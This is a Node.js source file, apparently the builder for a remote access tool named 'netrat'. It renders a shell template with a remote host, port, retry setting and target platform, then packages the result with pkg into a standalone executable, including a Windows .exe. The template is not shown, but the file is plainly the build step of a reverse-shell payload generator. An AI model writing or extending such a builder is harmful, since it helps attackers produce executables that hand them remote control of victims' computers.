const debug = require('debug')('netrat')
const path = require('path')
const os = require('os')
const fs = require('fs')
const exec = require('pkg').exec
const Mustache = require('mustache')
const SEED_PATH = path.join(__dirname, 'seed', 'shell.mustache')
var OUT_NAME = 'netrat'

function builder (opts, destination) {
  // options: {os, rhost, rport, retry, architecture, nodeVersion}
  var stubPath = genStubFromTemplate(SEED_PATH, opts)

  OUT_NAME += (opts.os === 'win') ? '.exe' : ''
  var pkgArgs = ['--target', `node${opts.nodeVersion}-${opts.os}-${opts.architecture}`, '--output', path.join(destination, OUT_NAME)]
  startPkg(stubPath, pkgArgs)
}

function startPkg (stubPath, args) {
  var input = [stubPath].concat(args)
  exec(input).then(success).catch(fail)
}

function genStubFromTemplate (seedPath, opts) {
  var seed = fs.readFileSync(seedPath).toString()
  var file = Mustache.render(seed, opts)
  var outPath = path.join(seedPath, '../netrat-shell.js')
  fs.writeFileSync(outPath, file)
  // return path
  return outPath
}

function success (out) {
  // TODO: output from the pkg exec.
  console.log(out)

}

function fail (err) {
  // TODO: err from pkg exec. (boxen red border..)
  console.log(err)

}

module.exports = builder
